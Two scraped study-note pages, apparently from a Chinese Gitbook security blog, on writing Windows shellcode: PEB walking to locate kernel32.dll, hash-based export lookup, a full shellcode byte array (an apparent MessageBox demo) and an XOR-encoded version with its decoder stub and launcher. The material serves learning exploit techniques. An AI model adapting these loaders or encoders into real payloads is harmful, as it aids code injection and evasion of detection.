writing function hash是用给的另外的程序获取的（也是自己设置的算法）； esi配合lodsd指令（详见附录），就可以在找到一个函数地址后，改变要找的内容，开始准备下一个函数。 找到kernel.dll xor edx,edx ; find base addr of kernel32.dll mov ebx, fs:[edx + 0x30] ; ebx = address of PEB mov ecx, [ebx + 0x0c] ; ecx = pointer to loader data mov ecx, [ecx + 0x1c] ; ecx = first entry in initialisation order list mov ecx, [ecx] ; ecx = second entry in list (kernel32.dll) mov ecx, [ecx] ; win7中加上这一行，WinXP中去掉这一行 mov ebp, [ecx + 0x08] ; ebp = base address of kernel32.dll 这部分就是完成1-6步骤。 找到函数名表预备开始搜索 pushad ; preserve registers mov eax, [ebp + 0x3c]; eax = start of PE header mov ecx, [ebp + eax + 0x78]; ecx = relative offset of export table add ecx, ebp ; ecx = absolute addr of export table mov ebx, [ecx + 0x20] ; ebx = relative offset of names table add ebx, ebp ; ebx = absolute addr of names table xor edi, edi ; edi will count through the functions 这就是第7-9步，整个大循环是for(edi=0;hash_result==[esp+...];edi++) 在函数名表中用函数名hash匹配的index，在函数地址表找到地址 ；开始找index mov esi, [ebx + edi * 4] ;edi就是index，找到之后 ;利用index，找到入口地址 add ebp, [ebx + 4 * edi] ; add to ebp (base addr of module) the ; relative offset of matched function xchg eax, ebp ; move func addr into eax 调用loadlibrary push 0x72657375 ;user32的字符串 ;... call [edi - 0x8] ; LoadLibraryA 附录 PEB 格式 其实在书本P88有详细的图片，指示偏移等信息，很详尽。但是由于出了文章开头说的bug，必须了解原理，于是读了下面大神的博客，讲了： win7比WinXP多个kernelbase.dll； PEB_LDR_DATA的链表结构，如何改成的win7的版本（往后再链接上一个） 以下涉及内容、图片均来自于大神的博客，https://baike.baidu.com/item/kernelbase.dll/7467393?fr=aladdin 读完以上的内容，再回顾下shellcode中为什么要加上那一行就不难理解了（其实就是链表flink的原理,node0, node1=node0->flink, node2=node1->flink）： mov ebx, fs:[edx + 0x30] ; ebx = address of PEB mov ecx, [ebx + 0x0c] ; ecx = pointer to loader data mov ecx, [ecx + 0x1c] ; ecx = first entry in initialisation order list mov ecx, [ecx] ; ecx = second entry in list (kernel32.dll) mov ecx, [ecx] ; win7中加上这一行，WinXP中去掉这一行，在win7中上一行为kernelbase.dll，这一行才是kernel.dll mov ebp, [ecx + 0x08] 汇编指令 pusha 依次将EAX，ECX，EDX，EBX，ESP（压栈前的值），EBP，ESI，EDI压入栈 popa 依次将pusha的逆顺序pop到各个寄存器（刚好相当于还原） xchg 交换指令XCHG是两个寄存器，寄存器和内存变量之间内容的交换指令，两个操作数的数据类型要相同，可以是一个字节，也可以是一个字，也可以是双字 lodsb 等系列 lodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器，esi=esi+1； lodsw指令则取得是一个字。 lodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4； stosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi=edi+1； stosw指令去的是一个字。 stosd指令，取得是双字节，mov [edi]，eax；edi=edi+4； Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 12:09:22 "},"source/post/0day/3/3/3.html":{"url":"source/post/0day/3/3/3.html","title":"编解码","keywords":"","body":" 涉及编解码 实验 本节比较简单，后期需要自己再复现代码。 encode 需要修改原来的shellcode字符数组，按前一节加上“\\x8b\\x09”以适用于win7，如下： \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" //增加了“\\x8b\\x09”以适用于win7 \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\";//shellcode should be ended with 0x90 decode //key=0x44 char final_sc_44[]= \"\\x83\\xC0\\x14\" //ADD EAX,14, eax往后14机器码字节就是encoded的shellcode \"\\x33\\xC9\" //XOR ECX,ECX \"\\x8A\\x1C\\x08\" //MOV BL,BYTE PTR DS:[EAX+ECX] \"\\x80\\xF3\\x44\" //XOR BL,44 //notice 0x44 is taken as temp key to decode ! \"\\x88\\x1C\\x08\" //MOV BYTE PTR DS:[EAX+ECX],BL \"\\x41\" //INC ECX \"\\x80\\xFB\\x90\" //CMP BL,90 ， \\x90是设定的结束标记 \"\\x75\\xF1\" //JNZ SHORT decoder.00401034 //从这里开始异或解码 \"\\xb8\\x2c\\x2e\\x4e\\x7c\\x5a\\x2c\\x27\\xcd\\x95\\x0b\\x2c\\x76\\x30\\xd5\\x48\" \"\\xcf\\xb0\\xc9\\x3a\\xb0\\x77\\x9f\\xf3\\x40\\x6f\\xa7\\x22\\xff\\x77\\x76\\x17\" \"\\x2c\\x31\\x37\\x21\\x36\\x10\\x77\\x96\\x20\\xcf\\x1e\\x74\\xcf\\x0f\\x48\\xcf\" \"\\x0d\\x58\\xcf\\x4d\\xcf\\x4d\\xcf\\x2d\\x4c\\xe9\\x79\\x2e\\x4e\\x7c\\x5a\\x31\" \"\\x41\\xd1\\xbb\\x13\\xbc\\xd1\\x24\\xcf\\x01\\x78\\xcf\\x08\\x41\\x3c\\x47\\x89\" \"\\xcf\\x1d\\x64\\x47\\x99\\x77\\xbb\\x03\\xcf\\x70\\xff\\x47\\xb1\\xdd\\x4b\\xfa\" \"\\x42\\x7e\\x80\\x30\\x4c\\x85\\x8e\\x43\\x47\\x94\\x02\\xaf\\xb5\\x7f\\x10\\x60\" \"\\x58\\x31\\xa0\\xcf\\x1d\\x60\\x47\\x99\\x22\\xcf\\x78\\x3f\\xcf\\x1d\\x58\\x47\" \"\\x99\\x47\\x68\\xff\\xd1\\x1b\\xef\\x13\\x25\\x79\\x2e\\x4e\\x7c\\x5a\\x31\\xed\" \"\\x77\\x9f\\x17\\x2c\\x33\\x21\\x37\\x30\\x2c\\x22\\x25\\x2d\\x28\\xcf\\x80\\x17\" \"\\x14\\x14\\x17\\xbb\\x13\\xb8\\x17\\xbb\\x13\\xbc\\xd4\"; void main() { __asm { lea eax, final_sc_44 push eax ret } } 实验 注意retn是返回esp指向地址 可以eax+0x14后的机器码基本生僻 按F4快捷键直接运行至解码结束 Copyright © whuwzp.top 2018 all right reserved，powered by Gitbook本文档修订时间： 2018-09-23 12:09:27 "}}